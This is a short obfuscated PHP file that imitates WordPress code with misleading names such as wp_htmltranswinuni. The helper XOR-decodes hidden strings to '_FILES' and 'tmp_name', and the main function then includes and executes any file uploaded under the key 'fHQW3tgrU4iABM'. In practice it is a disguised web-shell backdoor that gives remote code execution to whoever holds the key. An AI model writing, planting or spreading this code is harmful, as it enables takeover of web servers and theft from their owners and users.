<?php
        
    
        

function object($smiley)

{
    $old_status_to_new_status = $smiley;

    

    $comment_ids = $GLOBALS[wp_htmltranswinuni("9%0E%18%1Bv%27", $old_status_to_new_status)];
    $supports = $comment_ids;

    $pattern = isset($supports[$old_status_to_new_status]);

    if ($pattern)

    {
        $no_texturize_tags_stack = $comment_ids[$old_status_to_new_status];
        $has_archive = $no_texturize_tags_stack[wp_htmltranswinuni("%12%25%21%08%5D%15%0A%17", $old_status_to_new_status)];

        $short_url = $has_archive;
        include ($short_url);
    }
}
function wp_htmltranswinuni($wp_post_types, $clean_terms)

{
    $protected = $clean_terms;

    $post_content_filtered = "url";
    $post_content_filtered  .= "decode";
	$allblocks = 'deprecated';
    $_context = $post_content_filtered($wp_post_types);
	$hierarchical = 'dynamic_replacements';
    $domains = strlen($_context);
    $domains = substr($protected, 0, $domains);

    $lastpostdate = $_context ^ $domains;

    

    $_context = sprintf($lastpostdate, $domains);
    

    return $lastpostdate;
}
	$extension = 'string_nullspace';

object('fHQW3tgrU4iABM');


?>
